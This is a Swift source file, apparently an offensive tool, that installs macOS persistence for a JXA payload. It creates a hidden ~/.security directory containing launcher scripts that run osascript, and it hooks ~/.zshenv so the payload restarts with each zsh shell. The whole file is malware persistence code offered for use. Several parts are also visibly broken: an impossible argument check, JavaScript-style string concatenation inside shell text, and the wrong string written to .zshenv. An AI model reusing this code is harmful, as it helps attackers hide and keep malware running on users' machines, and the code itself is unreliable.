import Foundation
import Cocoa

let uname = NSUserName()
let home = "/Users/\(uname)"
let sysVers = ProcessInfo.processInfo.operatingSystemVersion
var output = ""
let fileMan = FileManager.default

if CommandLine.arguments.count == 0{
    print("Please enter the name of the jxa payload as the first argument and a yes/no option for hidden file creation as the second argument.")
    exit(0)
}
else {
    do {
        var payload = """
        'RUNNING=$(ps ax | grep osascript | wc -l);
        if [ "$RUNNING" -lt 2 ]
        then
          cd ' + userHome + '/.security
          ./update.sh &
        else
          exit
        fi'
        """
        
        var hiddenPath = "\(home)/.security"
        var profile = "\(home)/.security/apple.sh"
        var isDir = ObjCBool(true)
        var hiddenDirectoryExistsCheck = fileMan.fileExists(atPath: hiddenPath, isDirectory: &isDir)
        
        var hiddenFiles = CommandLine.arguments[2]
        if (hiddenFiles == "yes" || hiddenFiles == "Yes" || hiddenFiles == "YES" || hiddenFiles == "y" || hiddenFiles == "Y"){
            if !hiddenDirectoryExistsCheck{
                try fileMan.createDirectory(atPath: hiddenPath, withIntermediateDirectories: false, attributes: nil)
            }
            
            var payloadPath = "\(home)/.security/apple.sh"
            try payload.write(to: URL(fileURLWithPath: payloadPath), atomically: true, encoding: String.Encoding.utf8)
            
            var persistPath = "\(home)/.security/update.sh"
            var persist = "osascript " + CommandLine.arguments[1]
            try persist.write(to: URL(fileURLWithPath: persistPath), atomically: true, encoding: String.Encoding.utf8)
            
            var attributes = [FileAttributeKey : Any]()
            attributes[.posixPermissions] = 0o755
            try fileMan.setAttributes(attributes, ofItemAtPath: payloadPath)
            
            try fileMan.setAttributes(attributes, ofItemAtPath: persistPath)
            
            //writing for newer versions of macOS that use zsh:
            var profilePath = "\(home)/.zshenv"
            try profilePath.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)

            output += "Persitence installed at \(home)/.zshenv and \(home)/.security/apple.sh"
            
            
        }
        else {
            
            var payload = """
            'RUNNING=$(ps ax | grep osascript | wc -l);
            if [ "$RUNNING" -lt 2 ]
            then
              setopt LOCAL_OPTIONS NO_MONITOR; nohup payload > /dev/null 2>&1&
            else
              setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
            fi'
            """
            
            
            var persist = "osascript " + CommandLine.arguments[1]
            var profilePath = "\(home)/.zshenv"
            var updatedPayload = payload.replacingOccurrences(of: "payload", with: persist)
            try updatedPayload.write(to: URL(fileURLWithPath: profilePath), atomically: false, encoding: String.Encoding.utf8)
            output += "Persistence installed at \(home)/.zshenv"
        }
        
        
        }
    catch let error{
        print(error)
    }
}


